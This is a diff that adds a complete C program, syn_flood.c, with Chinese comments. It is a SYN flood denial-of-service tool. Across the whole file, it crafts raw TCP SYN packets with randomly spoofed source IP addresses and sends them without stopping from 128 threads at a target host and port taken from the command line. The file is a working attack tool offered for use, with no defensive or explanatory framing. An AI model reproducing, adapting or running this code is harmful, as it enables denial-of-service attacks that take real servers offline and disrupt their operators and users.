@@ -1,0 +1,237 @@
+/*************************************************************************
+    > File Name: syn_flood.c
+    > Author: Jiange
+    > Mail: jiangezh@qq.com 
+    > Created Time: 2016年01月01日 星期五 22时32分34秒
+ ************************************************************************/
+
+#include <stdio.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <string.h>
+#include <netdb.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <time.h> 
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+/* 最多线程数 */
+#define MAXCHILD 128
+
+/* 原始套接字 */
+int sockfd;
+
+/* 程序活动标志 */
+static int alive = -1;
+
+/* 随机函数产生函数 */
+static long inline
+myrandom (int begin, int end)
+{
+	int gap = end - begin +1;
+	int ret = 0;
+
+	/* 用系统时间初始化 */
+	srand((unsigned)time(0));
+	/* 产生一个介于begin和end之间的值 */
+	ret = rand()%gap + begin;
+	return ret;
+}
+
+
+/* CRC16校验 */
+unsigned short inline
+checksum (unsigned short *buffer, unsigned short size)     
+{  
+
+	unsigned long cksum = 0;
+	
+	while(size>1){
+		cksum += *buffer++;
+		size  -= sizeof(unsigned short);
+	}
+	
+	if(size){
+		cksum += *(unsigned char *)buffer;
+	}
+	
+	cksum = (cksum >> 16) + (cksum & 0xffff);
+	cksum += (cksum >> 16);		
+	
+	return((unsigned short )(~cksum));
+}
+
+/* 发送SYN包函数
+ * 填写IP头部，TCP头部
+ * TCP伪头部仅用于校验和的计算
+ */
+void
+send_synflood(struct sockaddr_in *addr)
+{ 
+	char buf[40], sendbuf[40];
+	int len;
+	struct ip ip;
+	struct tcphdr tcp;
+
+	struct pseudohdr
+	{
+		struct in_addr saddr;
+		struct in_addr daddr;
+		u_char zero;
+		u_char protocol;
+		u_short length;
+	} pseudoheader;
+	len = sizeof(struct ip) + sizeof(struct tcphdr);
+
+	ip.ip_v = 4;
+	ip.ip_hl = sizeof(struct ip)>>2;
+	ip.ip_tos = 0;
+	ip.ip_len = htons(len);
+	ip.ip_id = 0;
+	ip.ip_off = 0;
+	ip.ip_ttl = myrandom (128, 255);
+	ip.ip_p = IPPROTO_TCP;
+	ip.ip_sum = 0;
+	ip.ip_dst = addr->sin_addr;
+
+	tcp.th_sport = htons(1500);
+	tcp.th_dport = addr->sin_port;
+	tcp.seq = htonl ((unsigned long) myrandom(0, 65535)); 
+	tcp.ack_seq = htons (myrandom(0, 65535));  
+	tcp.th_off = 5;
+	tcp.th_flags = TH_SYN;
+	tcp.th_win = htons (myrandom(0, 65535));  
+	tcp.th_sum = 0;
+
+	pseudoheader.zero = 0;
+	pseudoheader.protocol = 4;
+	pseudoheader.length = sizeof(struct tcphdr);
+
+	/* 处于活动状态时持续发送SYN包 */
+	while(alive)
+	{
+		ip.ip_src.s_addr = random();
+		pseudoheader.saddr.s_addr = ip.ip_src.s_addr;
+		printf("source ip=%s\n", inet_ntoa(ip.ip_src));
+		pseudoheader.daddr.s_addr = addr->sin_addr.s_addr;
+		bzero(buf, sizeof(buf));
+		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
+		memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
+		tcp.th_sum = checksum((u_short *)&buf, 12+sizeof(struct tcphdr));
+		bzero(sendbuf, sizeof(sendbuf));
+		memcpy(sendbuf, &ip, sizeof(ip));
+		memcpy(sendbuf+sizeof(ip), &tcp, sizeof(tcp));
+		if (
+			sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
+			< 0)
+		{
+			perror("sendto()");
+			pthread_exit("fail");
+		}
+		//sleep(1);
+	}
+}
+
+/* 信号处理函数,设置退出变量alive */
+void 
+sig_int(int signo)
+{
+	alive = 0;
+}
+
+/* 主函数 */
+int 
+main(int argc, char *argv[])
+{
+	struct sockaddr_in addr;
+	struct hostent * host = NULL;
+
+	int i = 0;
+	pthread_t pthread[MAXCHILD];
+	int err = -1;
+
+	alive = 1;
+	/* 截取信号CTRL+C */
+	signal(SIGINT, sig_int);
+
+	/* 参数是否数量正确 */
+	if(argc < 3)
+	{
+		printf("usage: syn <IPaddress> <Port>\n");
+		exit(1);
+	}
+
+	bzero(&addr, sizeof(addr));
+
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(atol(argv[2]));
+
+	if(inet_aton(argv[1], &addr.sin_addr) == 0)
+	{
+		/* 为DNS地址，查询并转换成IP地址 */
+		host = gethostbyname(argv[1]);
+		if(host == NULL)
+		{
+			perror("gethostbyname()");
+			exit(1);
+		}
+		addr.sin_addr = *((struct in_addr*)(host->h_addr));
+		//return 0;
+	}
+
+	if((addr.sin_addr.s_addr <=0) || (addr.sin_port <=0)){
+		printf("Format Error\n");
+		exit(1);
+	}
+
+	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
+
+	/* 建立原始socket */
+	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);	
+	if (sockfd < 0)	   
+	{
+		perror("socket()");
+		exit(1);
+	}
+	/* 设置IP选项 */
+	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1")) < 0)
+	{
+		perror("setsockopt()");
+		exit(1);
+	}
+
+	/* 将程序的权限修改为普通用户 */
+	setuid(getpid());
+
+	/* 建立多个线程协同工作 */
+	for(i=0; i<MAXCHILD; i++)
+	{
+		err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
+		if(err != 0)
+		{
+			perror("pthread_create()");
+			exit(1);
+		}
+	}
+
+	/* 等待线程结束 */
+	for(i=0; i<MAXCHILD; i++)
+	{
+		err = pthread_join(pthread[i], NULL);
+		if(err != 0)
+		{
+			perror("pthread_join Error\n");
+			exit(1);
+		}
+	}
+
+	close(sockfd);
+
+	return 0;
+}
